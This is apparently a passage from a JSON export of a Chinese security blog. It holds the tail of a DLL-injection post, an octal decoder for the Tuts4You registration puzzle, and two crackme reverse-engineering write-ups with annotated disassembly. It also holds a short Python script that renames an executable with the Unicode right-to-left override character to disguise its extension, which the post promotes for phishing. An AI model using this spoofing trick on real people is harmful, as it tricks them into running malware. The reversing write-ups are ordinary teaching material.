这份代码并不是通用注入代码（如果需要通用需要自行解析pe头结构从中取出kernel32.dll的GetProcAddress地址）,所以64位windows上需要把vs设置为编译x64\n","cover":"","link":"2017/10/24/dll注入到指定进程.html","preview":"\u003cp\u003etalk is cheap,show me code\n代码有详细注释，文章底部提示了一些坑\u003c/p\u003e\n","title":"dll注入到指定进程"},{"content":"\n\n\n\n这个技术虽然老掉牙，但在网络钓鱼中非常好用\n\n## 目录结构\n\n```\n1.py\nrc_srceen.exe\n```\n\n## py文件内容\n\n```python\nimport os\nname = \"\\u202Excod.exe\"\nos.rename(os.path.join(os.getcwd(),'re_screen.exe'),os.path.join(os.getcwd(),\"re_screen\"+name))\n```\n\n## 执行后\n\n![](http://images2017.cnblogs.com/blog/1106918/201710/1106918-20171024180520926-960725164.png)\n\n## 原理\nUnicode包含若干个特殊字符串，允许在正常情况下从左到右的文本中插入从右到左的文字.其中一个右到左覆写字符串就是“U+202E”\n详见[千万小心从右向左覆盖技术 恶意软件经常用这个方法骗用户](http://toutiao.secjia.com/right-to-left-override)\n","cover":"","link":"2017/10/24/从右向左覆盖实现恶意软件扩展名欺骗.html","preview":"\u003cp\u003e这个技术虽然老掉牙，但在网络钓鱼中非常好用\u003c/p\u003e\n","title":"从右向左覆盖实现恶意软件扩展名欺骗"},{"content":"\n\n\n\n基于LeanCloud的文章阅读次数统计插件\nhttps://github.com/Weic96/LeanStatistics.js\n\n基于LeanCloud的文章评论\nhttps://github.com/xCss/Valine\n","cover":"","link":"2017/10/23/静态博客阅读次数与评论解决方案.html","preview":"","title":"静态博客阅读次数与评论解决方案"},{"content":"\n\n\n\n\n只说一个，是八进制,下面是解码脚本\n环境python3\n\n\u003ciframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2\u0026id=28785327\u0026auto=1\u0026height=66\"\u003e\u003c/iframe\u003e\n```python\n# -*-coding:utf-8-*-\n# Author: Akkuman\n# Blog: hacktech.cn\n\n# Tust4You的问题是八进制,所以八进制转ascii即可\n# 解码问题\nprint(\"Please input the code what you see on register's page of Tust 4 You:\")\nencode_code = input()\nencode_list = encode_code.split()\nprint(\"\\nthe question is\\n\")\nfor i in encode_list:\n\ti = int(i,8)\n\tprint(chr(i), end=\"\")\n```\n","cover":"","link":"2017/09/24/tuts4you-register.html","preview":"\u003cp\u003e只说一个，是八进制,下面是解码脚本\n环境python3\u003c/p\u003e\n","title":"Tuts4you注册问题解码"},{"content":"\n\n\n\n说实话，今天被自己蠢哭了  \n\n因为看多了一个字符，以为是输入字符变形后的base64编码，也怪自己没大致看过base64汇编形式，把base64跟完了用py实现完算法才意思到是base64，这是题外话  \n\n本人初学者，两天或一天一个cm练练，大家可以与我交流akkumans@qq.com，[我博客](http://hacktech.cn)  \n\n上面的题外话就是今天搞的一个cm，被自己蠢哭了，不过也算是base64编码流程无比清晰了，不算是无用功  \n\n这个cm是一个控制台的，丢到xp无法运行，本机只装了x64dbg(x32dbg)，用这个调试软件来试试吧  \n```\nC:\\Users\\Administrator\\Desktop\u003ereverse3.exe\nPlease enter the flag:97103012\nwrong input\n```\n\n字符串搜索，找到判断的地方\n```asm\n01241269 | 85 C0                    | test eax,eax                             | zf=1 =\u003e eax=0\n0124126B | 75 07                    | jne reverse3.1241274                     |\n0124126D | 68 78 21 24 01           | push reverse3.1242178                    | 1242178:\"this is the right flag\"\n01241272 | EB 05                    | jmp reverse3.1241279                     |\n01241274 | 68 90 21 24 01           | push reverse3.1242190                    | 1242190:\"wrong input\"\n01241279 | FF 15 B0 20 24 01        | call dword ptr ds:[\u003c\u0026puts\u003e]              |\n0124127F | 8B 4D FC                 | mov ecx,dword ptr ss:[ebp-4]             |\n01241282 | 83 C4 04                 | add esp,4                                |\n01241285 | 33 CD                    | xor ecx,ebp                              |\n01241287 | 33 C0                    | xor eax,eax                              | eax:\"OTacMDMzMTI=\"\n01241289 | E8 92 00 00 00           | call reverse3.1241320                    |\n0124128E | 8B E5                    | mov esp,ebp                              |\n01241290 | 5D                       | pop ebp                                  |\n01241291 | C3                       | ret                                      |\n```\n\n可以看到要得到flag，jne就不能跳，也就是`test eax,eax`后的ZF=1，也就是eax=0  \n那这个eax=0从何而来？我们接着往上看  \n```asm\n012411A0 | 55                       | push ebp                                 |\n012411A1 | 8B EC                    | mov ebp,esp                              |\n012411A3 | 83 EC 44                 | sub esp,44                               |\n012411A6 | A1 04 30 24 01           | mov eax,dword ptr ds:[1243004]           | eax:\"OTacMDMzMTI=\"\n012411AB | 33 C5                    | xor eax,ebp                              |\n012411AD | 89 45 FC                 | mov dword ptr ss:[ebp-4],eax             |\n012411B0 | 0F 57 C0                 | xorps xmm0,xmm0                          |\n012411B3 | C7 45 F8 00 00 00 00     | mov dword ptr ss:[ebp-8],0               |\n012411BA | 68 58 21 24 01           | push reverse3.1242158                    | 1242158:\"Please enter the flag:\"\n012411BF | 0F 11 45 E8              | movups xmmword ptr ss:[ebp-18],xmm0      |\n012411C3 | 0F 11 45 C0              | movups xmmword ptr ss:[ebp-40],xmm0      |\n012411C7 | 0F 11 45 D0              | movups xmmword ptr ss:[ebp-30],xmm0      |\n012411CB | 66 0F D6 45 E0           | movq qword ptr ss:[ebp-20],xmm0          |\n012411D0 | E8 1B 01 00 00           | call reverse3.12412F0                    |\n012411D5 | 8D 45 E8                 | lea eax,dword ptr ss:[ebp-18]            |\n012411D8 | 50                       | push eax                                 | eax:\"OTacMDMzMTI=\"\n012411D9 | 68 70 21 24 01           | push reverse3.1242170                    | 1242170:\"%20s\"\n012411DE | E8 CD 00 00 00           | call reverse3.12412B0                    |\n012411E3 | 8D 4D E8                 | lea ecx,dword ptr ss:[ebp-18]            | 你的输入 -\u003e ecx\n012411E6 | 83 C4 0C                 | add esp,C                                |\n012411E9 | 8D 51 01                 | lea edx,dword ptr ds:[ecx+1]             | 你的输入减第一个字节 -\u003e edx\n012411EC | 0F 1F 40 00              | nop dword ptr ds:[eax]                   | eax:\"OTacMDMzMTI=\"\n012411F0 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |\n012411F2 | 41                       | inc ecx                                  |\n012411F3 | 84 C0                    | test al,al                               |\n012411F5 | 75 F9                    | jne reverse3.12411F0                     |\n012411F7 | 2B CA                    | sub ecx,edx                              | 你的输入的长度 -\u003e ecx\n012411F9 | 8D 55 E8                 | lea edx,dword ptr ss:[ebp-18]            | 输入 -\u003e edx\n012411FC | 56                       | push esi                                 | esi:\"TacMDMzMTI=\"\n012411FD | 51                       | push ecx                                 |\n012411FE | 51                       | push ecx                                 |\n012411FF | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |\n01241202 | E8 F9 FD FF FF           | call reverse3.1241000                    | base64(你的输入) -\u003e [ebp - 0x40]\n01241207 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |\n0124120A | 83 C4 08                 | add esp,8                                |\n0124120D | 33 D2                    | xor edx,edx                              |\n0124120F | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             | esi:\"TacMDMzMTI=\"\n01241212 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |\n01241214 | 41                       | inc ecx                                  |\n01241215 | 84 C0                    | test al,al                               |\n01241217 | 75 F9                    | jne reverse3.1241212                     |\n01241219 | 2B CE                    | sub ecx,esi                              | 长度（base64你的输入） -\u003e ecx\n0124121B | 74 37                    | je reverse3.1241254                      |\n0124121D | 0F 1F 00                 | nop dword ptr ds:[eax]                   | eax:\"OTacMDMzMTI=\"\n01241220 | 8A 4C 15 C0              | mov cl,byte ptr ss:[ebp+edx-40]          |\n01241224 | 33 C0                    | xor eax,eax                              | eax:\"OTacMDMzMTI=\"\n01241226 | 3A 88 08 21 24 01        | cmp cl,byte ptr ds:[eax+1242108]         |\n0124122C | 74 08                    | je reverse3.1241236                      |\n0124122E | 40                       | inc eax                                  | eax:\"OTacMDMzMTI=\"\n0124122F | 83 F8 1A                 | cmp eax,1A                               | eax:\"OTacMDMzMTI=\"\n01241232 | 72 F2                    | jb reverse3.1241226                      |\n01241234 | EB 0A                    | jmp reverse3.1241240                     |\n01241236 | 8A 80 24 21 24 01        | mov al,byte ptr ds:[eax+1242124]         |\n0124123C | 88 44 15 C0              | mov byte ptr ss:[ebp+edx-40],al          |\n01241240 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |\n01241243 | 42                       | inc edx                                  |\n01241244 | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             | esi:\"TacMDMzMTI=\"\n01241247 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |\n01241249 | 41                       | inc ecx                                  |\n0124124A | 84 C0                    | test al,al                               |\n0124124C | 75 F9                    | jne reverse3.1241247                     |\n0124124E | 2B CE                    | sub ecx,esi                              | esi:\"TacMDMzMTI=\"\n01241250 | 3B D1                    | cmp edx,ecx                              |\n01241252 | 72 CC                    | jb reverse3.1241220                      |\n01241254 | 6A 14                    | push 14                                  |\n01241256 | 8D 45 C0                 | lea eax,dword ptr ss:[ebp-40]            |\n01241259 | 68 40 21 24 01           | push reverse3.1242140                    | 1242140:\"o2Ffx3V0OjJtYW5spQ==\"\n0124125E | 50                       | push eax                                 | eax:\"OTacMDMzMTI=\"\n0124125F | FF 15 C4 20 24 01        | call dword ptr ds:[\u003c\u0026strncmp\u003e]           | 经过处理的base64与内置base64值比较，相等=\u003eeax=0\n01241265 | 83 C4 0C                 | add esp,C                                |\n01241268 | 5E                       | pop esi                                  | esi:\"TacMDMzMTI=\"\n01241269 | 85 C0                    | test eax,eax                             | zf=1 =\u003e eax=0\n0124126B | 75 07                    | jne reverse3.1241274                     |\n0124126D | 68 78 21 24 01           | push reverse3.1242178                    | 1242178:\"this is the right flag\"\n01241272 | EB 05                    | jmp reverse3.1241279                     |\n01241274 | 68 90 21 24 01           | push reverse3.1242190                    | 1242190:\"wrong input\"\n01241279 | FF 15 B0 20 24 01        | call dword ptr ds:[\u003c\u0026puts\u003e]              |\n0124127F | 8B 4D FC                 | mov ecx,dword ptr ss:[ebp-4]             |\n01241282 | 83 C4 04                 | add esp,4                                |\n01241285 | 33 CD                    | xor ecx,ebp                              |\n01241287 | 33 C0                    | xor eax,eax                              | eax:\"OTacMDMzMTI=\"\n01241289 | E8 92 00 00 00           | call reverse3.1241320                    |\n0124128E | 8B E5                    | mov esp,ebp                              |\n01241290 | 5D                       | pop ebp                                  |\n01241291 | C3                       | ret                                      |\n```\n\n看来是这几行做了手脚，压入了两个参数  \n```asm\n01241259 | 68 40 21 24 01           | push reverse3.1242140                    | 1242140:\"o2Ffx3V0OjJtYW5spQ==\"\n0124125E | 50                       | push eax                                 | eax:\"OTacMDMzMTI=\"\n0124125F | FF 15 C4 20 24 01        | call dword ptr ds:[\u003c\u0026strncmp\u003e]           | 经过处理的base64与内置base64值比较，相等=\u003eeax=0\n```\n\n我们跟这个call进去看看\n```asm\n6C2F8C30 | 53                       | push ebx                                 |\n6C2F8C31 | 56                       | push esi                                 | esi:\"TacMDMzMTI=\"\n6C2F8C32 | 8B 4C 24 0C              | mov ecx,dword ptr ss:[esp+C]             | 我们输入的base64变形后的值\n6C2F8C36 | 8B 54 24 10              | mov edx,dword ptr ss:[esp+10]            | 内置base64值\n6C2F8C3A | 8B 5C 24 14              | mov ebx,dword ptr ss:[esp+14]            |\n6C2F8C3E | F7 C3 FF FF FF FF        | test ebx,FFFFFFFF                        |\n6C2F8C44 | 74 50                    | je ucrtbase.6C2F8C96                     |\n6C2F8C46 | 2B CA                    | sub ecx,edx                              |\n6C2F8C48 | F7 C2 03 00 00 00        | test edx,3                               |\n6C2F8C4E | 74 17                    | je ucrtbase.6C2F8C67                     |\n6C2F8C50 | 0F B6 04 0A              | movzx eax,byte ptr ds:[edx+ecx]          | edx+ecx*1:\"OTacMDMzMTI=\"\n6C2F8C54 | 3A 02                    | cmp al,byte ptr ds:[edx]                 |\n6C2F8C56 | 75 48                    | jne ucrtbase.6C2F8CA0                    |\n6C2F8C58 | 85 C0                    | test eax,eax                             | eax:\"OTacMDMzMTI=\"\n6C2F8C5A | 74 3A                    | je ucrtbase.6C2F8C96                     |\n6C2F8C5C | 42                       | inc edx                                  |\n6C2F8C5D | 83 EB 01                 | sub ebx,1                                |\n6C2F8C60 | 76 34                    | jbe ucrtbase.6C2F8C96                    |\n6C2F8C62 | F6 C2 03                 | test dl,3                                |\n6C2F8C65 | 75 E9                    | jne ucrtbase.6C2F8C50                    |\n6C2F8C67 | 8D 04 0A                 | lea eax,dword ptr ds:[edx+ecx]           | eax:\"OTacMDMzMTI=\"\n6C2F8C6A | 25 FF 0F 00 00           | and eax,FFF                              | eax:\"OTacMDMzMTI=\"\n6C2F8C6F | 3D FC 0F 00 00           | cmp eax,FFC                              | eax:\"OTacMDMzMTI=\"\n6C2F8C74 | 77 DA                    | ja ucrtbase.6C2F8C50                     |\n6C2F8C76 | 8B 04 0A                 | mov eax,dword ptr ds:[edx+ecx]           | eax:\"OTacMDMzMTI=\"\n6C2F8C79 | 3B 02                    | cmp eax,dword ptr ds:[edx]               | eax:\"OTacMDMzMTI=\"\n6C2F8C7B | 75 D3                    | jne ucrtbase.6C2F8C50                    |\n6C2F8C7D | 83 EB 04                 | sub ebx,4                                |\n6C2F8C80 | 76 14                    | jbe ucrtbase.6C2F8C96                    |\n6C2F8C82 | 8D B0 FF FE FE FE        | lea esi,dword ptr ds:[eax-1010101]       | esi:\"TacMDMzMTI=\"\n6C2F8C88 | 83 C2 04                 | add edx,4                                |\n6C2F8C8B | F7 D0                    | not eax                                  | eax:\"OTacMDMzMTI=\"\n6C2F8C8D | 23 C6                    | and eax,esi                              | eax:\"OTacMDMzMTI=\", esi:\"TacMDMzMTI=\"\n6C2F8C8F | A9 80 80 80 80           | test eax,80808080                        | eax:\"OTacMDMzMTI=\"\n6C2F8C94 | 74 D1                    | je ucrtbase.6C2F8C67                     |\n6C2F8C96 | 33 C0                    | xor eax,eax                              | eax:\"OTacMDMzMTI=\"\n6C2F8C98 | 5E                       | pop esi                                  | esi:\"TacMDMzMTI=\"\n6C2F8C99 | 5B                       | pop ebx                                  |\n6C2F8C9A | C3                       | ret                                      |\n6C2F8C9B | EB 03                    | jmp ucrtbase.6C2F8CA0                    |\n6C2F8C9D | CC                       | int3                                     |\n6C2F8C9E | CC                       | int3                                     |\n6C2F8C9F | CC                       | int3                                     |\n6C2F8CA0 | 1B C0                    | sbb eax,eax                              | eax:\"OTacMDMzMTI=\"\n6C2F8CA2 | 83 C8 01                 | or eax,1                                 | eax:\"OTacMDMzMTI=\"\n6C2F8CA5 | 5E                       | pop esi                                  | esi:\"TacMDMzMTI=\"\n6C2F8CA6 | 5B                       | pop ebx                                  |\n6C2F8CA7 | C3                       | ret                                      |\n```\n\n这段代码的跳转比较复杂，我们主要看这段  \n```asm\n6C2F8C50 | 0F B6 04 0A              | movzx eax,byte ptr ds:[edx+ecx]          | edx+ecx*1:\"OTacMDMzMTI=\"\n6C2F8C54 | 3A 02                    | cmp al,byte ptr ds:[edx]                 | edx:\"o2Ffx3V0OjJtYW5spQ==\"\n6C2F8C56 | 75 48                    | jne ucrtbase.6C2F8CA0                    |\n6C2F8C58 | 85 C0                    | test eax,eax                             |\n6C2F8C5A | 74 3A                    | je ucrtbase.6C2F8C96                     |\n6C2F8C5C | 42                       | inc edx                                  | edx:\"o2Ffx3V0OjJtYW5spQ==\"\n6C2F8C5D | 83 EB 01                 | sub ebx,1                                |\n6C2F8C60 | 76 34                    | jbe ucrtbase.6C2F8C96                    |\n6C2F8C62 | F6 C2 03                 | test dl,3                                |\n6C2F8C65 | 75 E9                    | jne ucrtbase.6C2F8C50                    |\n6C2F8C67 | 8D 04 0A                 | lea eax,dword ptr ds:[edx+ecx]           | edx+ecx*1:\"OTacMDMzMTI=\"\n6C2F8C6A | 25 FF 0F 00 00           | and eax,FFF                              |\n6C2F8C6F | 3D FC 0F 00 00           | cmp eax,FFC                              |\n6C2F8C74 | 77 DA                    | ja ucrtbase.6C2F8C50                     |\n```\n\n通读可以发现就是把我们输入的base64变形后的值(`OTacMDMzMTI=`)按字节取出来一一和内置的`o2Ffx3V0OjJtYW5spQ==`做比较，只有当全部相等才跳到这把eax置零  \n```asm\n6C2F8C96 | 33 C0                    | xor eax,eax                              \n```\n\n然后退出函数\n\n那么这个`OTacMDMzMTI=`是个什么呢？看着是个base64，但是我们解出来是`96?3312`，完全不是我们输入的`97103012`了，这个只怎么来的呢？我们继续看这段  \n```asm\n012411FF | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |\n01241202 | E8 F9 FD FF FF           | call reverse3.1241000                    |base64(你的输入) -\u003e [ebp - 0x40]\n01241207 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |\n0124120A | 83 C4 08                 | add esp,8                                |\n0124120D | 33 D2                    | xor edx,edx                              | edx:\"97103012\"\n0124120F | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             |\n01241212 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |\n01241214 | 41                       | inc ecx                                  |\n01241215 | 84 C0                    | test al,al                               |\n01241217 | 75 F9                    | jne reverse3.1241212                     |\n01241219 | 2B CE                    | sub ecx,esi                              | 长度（base64你的输入） -\u003e ecx\n0124121B | 74 37                    | je reverse3.1241254                      |\n0124121D | 0F 1F 00                 | nop dword ptr ds:[eax]                   |\n01241220 | 8A 4C 15 C0              | mov cl,byte ptr ss:[ebp+edx-40]          |\n01241224 | 33 C0                    | xor eax,eax                              |\n01241226 | 3A 88 08 21 24 01        | cmp cl,byte ptr ds:[eax+1242108]         | eax+1242108:\"abcdefghijklmnopqrstuvwxyz\"\n0124122C | 74 08                    | je reverse3.1241236                      |\n0124122E | 40                       | inc eax                                  |\n0124122F | 83 F8 1A                 | cmp eax,1A                               |\n01241232 | 72 F2                    | jb reverse3.1241226                      |\n01241234 | EB 0A                    | jmp reverse3.1241240                     |\n01241236 | 8A 80 24 21 24 01        | mov al,byte ptr ds:[eax+1242124]         | eax+1242124:\"wxabopdefghijklqrstuvyzcmn\"\n0124123C | 88 44 15 C0              | mov byte ptr ss:[ebp+edx-40],al          |\n01241240 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |\n01241243 | 42                       | inc edx                                  | edx:\"97103012\"\n01241244 | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             |\n01241247 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |\n01241249 | 41                       | inc ecx                                  |\n0124124A | 84 C0                    | test al,al                               |\n0124124C | 75 F9                    | jne reverse3.1241247                     |\n0124124E | 2B CE                    | sub ecx,esi                              |\n01241250 | 3B D1                    | cmp edx,ecx                              | edx:\"97103012\"\n01241252 | 72 CC                    | jb reverse3.1241220                      |\n01241254 | 6A 14                    | push 14                                  |\n```\n\n下面这行代码有兴趣的可以跟进去看看，其实就是base64编码，苦逼的我傻乎乎地跟完了  \n```asm\n01241202 | E8 F9 FD FF FF           | call reverse3.1241000                    |base64(你的输入) -\u003e [ebp - 0x40]\n```\n\n那`97103012`的base64是`OTcxMDMwMTI=`呀，这个`OTacMDMzMTI=`是怎么来的呢？我们看着一段  \n```asm\n01241220 | 8A 4C 15 C0              | mov cl,byte ptr ss:[ebp+edx-40]          |\n01241224 | 33 C0                    | xor eax,eax                              |\n01241226 | 3A 88 08 21 24 01        | cmp cl,byte ptr ds:[eax+1242108]         | eax+1242108:\"abcdefghijklmnopqrstuvwxyz\"\n0124122C | 74 08                    | je reverse3.1241236                      |\n0124122E | 40                       | inc eax                                  |\n0124122F | 83 F8 1A                 | cmp eax,1A                               |\n01241232 | 72 F2                    | jb reverse3.1241226                      |\n01241234 | EB 0A                    | jmp reverse3.1241240                     |\n01241236 | 8A 80 24 21 24 01        | mov al,byte ptr ds:[eax+1242124]         | eax+1242124:\"wxabopdefghijklqrstuvyzcmn\"\n0124123C | 88 44 15 C0              | mov byte ptr ss:[ebp+edx-40],al          |\n01241240 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |\n01241243 | 42                       | inc edx                                  | edx:\"97103012\"\n01241244 | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             |\n01241247 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |\n01241249 | 41                       | inc ecx                                  |\n0124124A | 84 C0                    | test al,al                               |\n0124124C | 75 F9                    | jne reverse3.1241247                     |\n0124124E | 2B CE                    | sub ecx,esi                              |\n01241250 | 3B D1                    | cmp edx,ecx                              | edx:\"97103012\"\n01241252 | 72 CC                    | jb reverse3.1241220                      |\n```\n这一段的工作大家跟跟就知道，就是通过一次次循环将`OTcxMDMwMTI=`中的值通过下面这个对应关系一一置换  \n```\nabcdefghijklmnopqrstuvwxyz\nwxabopdefghijklqrstuvyzcmn\n```\n所以`OTcxMDMwMTI=`变成了`OTacMDMzMTI=`  \n\n好的，我们看到了这里，相信已经知道密码是什么了，也就是我们变形后的base64值要等于`o2Ffx3V0OjJtYW5spQ==`  \n那就倒着置换呗，得出来正确的base64是`e2Fib3V0OmJsYW5rfQ==`，解码为`{about:blank}`\n\n![](http://ww1.sinaimg.cn/large/c0264382gy1fjpd8arx26j20og0ge0tq.jpg)\n\n[例子CM](https://pan.baidu.com/s/1mi63WXM)\n","cover":"","link":"2017/09/20/一个查表置换的cm.html","preview":"\u003cp\u003e说实话，今天被自己蠢哭了\u003c/p\u003e\n\n\u003cp\u003e因为看多了一个字符，以为是输入字符变形后的base64编码，也怪自己没大致看过base64汇编形式，把base64跟完了用py实现完算法才意思到是base64，这是题外话\u003c/p\u003e\n","title":"一个查表置换的CM"},{"content":"\n\n\n\n这次找小伙伴要了他的一个CM，怎么说呢，这CM让我学到了不少，其实搞出来后感觉不难，就是有不少FPU浮点相关的指令和FPU寄存器完全没学过，查了不少资料，学到了很多  \n\n打开是这样  \n![](http://ww1.sinaimg.cn/large/c0264382gy1fjo0hr07rpj20bv07qq3v.jpg)\n\n无壳程序，我们直接od查找字符串，爆破我就不说了，直接改跳转  \n我第一次是找到这个判断的函数开头，一行行快速单步，确实发现了输入，但是后来很多命令不懂意思我也单步，导致看到后来也不知道怎么判断的  \n然后我改了策略，先逆着就近看看，怎么才能使条件成立  \n```asm\n004010EA  |.  F6C4 41       test ah,0x41                             ;  zf=0 -\u003e ah \u0026 0x41 != 0\n004010ED  |.  B8 00000000   mov eax,0x0\n004010F2  |.  0f95c0        setne al                                 ;  eax=1 -\u003e al=1 -\u003e zf=0\n004010F5  |.  8945 D0       mov [local.12],eax\n004010F8  |.  837D D0 01    cmp [local.12],0x1\n004010FC  |.  0F85 39000000 jnz 测试.0040113B                          ;  要求zf=1，即eax=0x1\n00401102  |.  BB 06000000   mov ebx,0x6\n00401107  |.  E8 F8FEFFFF   call 测试.00401004\n0040110C  |.  68 01030080   push 0x80000301\n00401111  |.  6A 00         push 0x0\n00401113  |.  68 00000000   push 0x0\n00401118  |.  68 04000080   push 0x80000004\n0040111D  |.  6A 00         push 0x0\n0040111F  |.  68 6D1B4800   push 测试.00481B6D                         ;  成功\n00401124  |.  68 04000000   push 0x4\n00401129  |.  BB 90164000   mov ebx,测试.00401690\n0040112E  |.  E8 36010000   call 测试.00401269\n00401133  |.  83C4 34       add esp,0x34\n00401136  |.  E9 34000000   jmp 测试.0040116F\n0040113B  |\u003e  BB 06000000   mov ebx,0x6\n00401140  |.  E8 BFFEFFFF   call 测试.00401004\n00401145  |.  68 01030080   push 0x80000301\n0040114A  |.  6A 00         push 0x0\n0040114C  |.  68 00000000   push 0x0\n00401151  |.  68 04000080   push 0x80000004\n00401156  |.  6A 00         push 0x0\n00401158  |.  68 721B4800   push 测试.00481B72                         ;  失败\n0040115D  |.  68 04000000   push 0x4\n```\n\n也就是说需要找ah相关的  \n接下来我们整体看看，因为第一次接触FPU浮点相关的指令和FPU寄存器，所以注释写的比较繁琐，望大家见谅  \n```asm\n0040100C  /.  55            push ebp\n0040100D  |.  8BEC          mov ebp,esp\n0040100F  |.  81EC 34000000 sub esp,0x34\n00401015  |.  6A FF         push -0x1\n00401017  |.  6A 08         push 0x8\n00401019  |.  68 02000116   push 0x16010002\n0040101E  |.  68 01000152   push 0x52010001\n00401023  |.  E8 47020000   call 测试.0040126F                         ;  执行后   输入的密码 -\u003e eax(1886b8)\n00401028  |.  83C4 10       add esp,0x10\n0040102B  |.  8945 FC       mov [local.1],eax                        ;  eax中你的输入 -\u003e ebp-4\n0040102E  |.  68 04000080   push 0x80000004\n00401033  |.  6A 00         push 0x0\n00401035  |.  8B45 FC       mov eax,[local.1]\n00401038  |.  85C0          test eax,eax\n0040103A  |.  75 05         jnz short 测试.00401041\n0040103C  |.  B8 5C1B4800   mov eax,测试.00481B5C\n00401041  |\u003e  50            push eax\n00401042  |.  68 01000000   push 0x1\n00401047  |.  BB A0134000   mov ebx,测试.004013A0\n0040104C  |.  E8 18020000   call 测试.00401269                         ;  eax=16进制(你的输入)   ecx=0\n00401051  |.  83C4 10       add esp,0x10                             ;  esp = 1000b\n00401054  |.  8945 F8       mov [local.2],eax                        ;  16进制(你的输入) -\u003e local.2\n00401057  |.  8B5D FC       mov ebx,[local.1]                        ;  你的输入 -\u003e ebx\n0040105A  |.  85DB          test ebx,ebx\n0040105C  |.  74 09         je short 测试.00401067\n0040105E  |.  53            push ebx                                 ;  输入压栈 ebp-38  local.14\n0040105F  |.  E8 F9010000   call 测试.0040125D\n00401064  |.  83C4 04       add esp,0x4                              ;  [ebp-38] + 4\n00401067  |\u003e  DB45 F8       fild [local.2]                           ;  十进制浮点(输入) -\u003e st0\n0040106A  |.  DD5D F0       fstp qword ptr ss:[ebp-0x10]             ;  st0 -\u003e ebp-10H\n0040106D  |.  DD45 F0       fld qword ptr ss:[ebp-0x10]              ;  ebp-10 -\u003e st0\n00401070  |.  DC05 5D1B4800 fadd qword ptr ds:[0x481B5D]             ;  st0 = st0 + 520\n00401076  |.  DD5D E8       fstp qword ptr ss:[ebp-0x18]             ;  十进制你的输入+520 -\u003e ebp-18H\n00401079  |.  6A FF         push -0x1\n0040107B  |.  6A 08         push 0x8\n0040107D  |.  68 03000116   push 0x16010003\n00401082  |.  68 01000152   push 0x52010001\n00401087  |.  E8 E3010000   call 测试.0040126F\n0040108C  |.  83C4 10       add esp,0x10\n0040108F  |.  8945 E4       mov [local.7],eax\n00401092  |.  68 04000080   push 0x80000004\n00401097  |.  6A 00         push 0x0\n00401099  |.  8B45 E4       mov eax,[local.7]\n0040109C  |.  85C0          test eax,eax\n0040109E  |.  75 05         jnz short 测试.004010A5\n004010A0  |.  B8 5C1B4800   mov eax,测试.00481B5C\n004010A5  |\u003e  50            push eax\n004010A6  |.  68 01000000   push 0x1\n004010AB  |.  BB A0134000   mov ebx,测试.004013A0\n004010B0  |.  E8 B4010000   call 测试.00401269\n004010B5  |.  83C4 10       add esp,0x10\n004010B8  |.  8945 E0       mov [local.8],eax\n004010BB  |.  8B5D E4       mov ebx,[local.7]\n004010BE  |.  85DB          test ebx,ebx\n004010C0  |.  74 09         je short 测试.004010CB\n004010C2  |.  53            push ebx\n004010C3  |.  E8 95010000   call 测试.0040125D\n004010C8  |.  83C4 04       add esp,0x4\n004010CB  |\u003e  DB45 E0       fild [local.8]                           ;  (641)10 -\u003e st0\n004010CE  |.  DD5D D8       fstp qword ptr ss:[ebp-0x28]             ;  st0 -\u003e ebp-28H\n004010D1  |.  DD45 E8       fld qword ptr ss:[ebp-0x18]              ;  [ebp-18H](十进制你的输入+520) -\u003e st0\n004010D4  |.  DC65 D8       fsub qword ptr ss:[ebp-0x28]             ;  st0 = st0 - [ebp-28H]  (641)10\n004010D7  |.  D9E4          ftst                                     ;  st0和0.0比较，据此设置FPU状态字C0,C2,C3位\n004010D9  |.  DFE0          fstsw ax\n004010DB  |.  F6C4 01       test ah,0x1\n004010DE  |.  74 02         je short 测试.004010E2\n004010E0  |.  D9E0          fchs                                     ;  st0改变符号位\n004010E2  |\u003e  DC1D 651B4800 fcomp qword ptr ds:[0x481B65]            ;  st0和[481B65](无限接近0的一个正浮点数)比较，据此设置FPU状态字C0,C2,C3位，并把st0弹到[481B65]\n004010E8  |.  DFE0          fstsw ax                                 ;  FPU状态字 -\u003e eax，根据下面可知，FPU状态字C0或C3为1均可\n004010EA  |.  F6C4 41       test ah,0x41                             ;  zf=0 -\u003e ah \u0026 0x41 != 0\n004010ED  |.  B8 00000000   mov eax,0x0\n004010F2  |.  0f95c0        setne al                                 ;  eax=1 -\u003e al=1 -\u003e zf=0\n004010F5  |.  8945 D0       mov [local.12],eax\n004010F8  |.  837D D0 01    cmp [local.12],0x1\n004010FC  |.  0F85 39000000 jnz 测试.0040113B                          ;  要求zf=1，即eax=0x1\n00401102  |.  BB 06000000   mov ebx,0x6\n00401107  |.  E8 F8FEFFFF   call 测试.00401004\n0040110C  |.  68 01030080   push 0x80000301\n00401111  |.  6A 00         push 0x0\n00401113  |.  68 00000000   push 0x0\n00401118  |.  68 04000080   push 0x80000004\n0040111D  |.  6A 00         push 0x0\n0040111F  |.  68 6D1B4800   push 测试.00481B6D                         ;  成功\n00401124  |.  68 04000000   push 0x4\n00401129  |.  BB 90164000   mov ebx,测试.00401690\n0040112E  |.  E8 36010000   call 测试.00401269\n00401133  |.  83C4 34       add esp,0x34\n00401136  |.  E9 34000000   jmp 测试.0040116F\n0040113B  |\u003e  BB 06000000   mov ebx,0x6\n00401140  |.  E8 BFFEFFFF   call 测试.00401004\n00401145  |.  68 01030080   push 0x80000301\n0040114A  |.  6A 00         push 0x0\n0040114C  |.  68 00000000   push 0x0\n00401151  |.  68 04000080   push 0x80000004\n00401156  |.  6A 00         push 0x0\n00401158  |.  68 721B4800   push 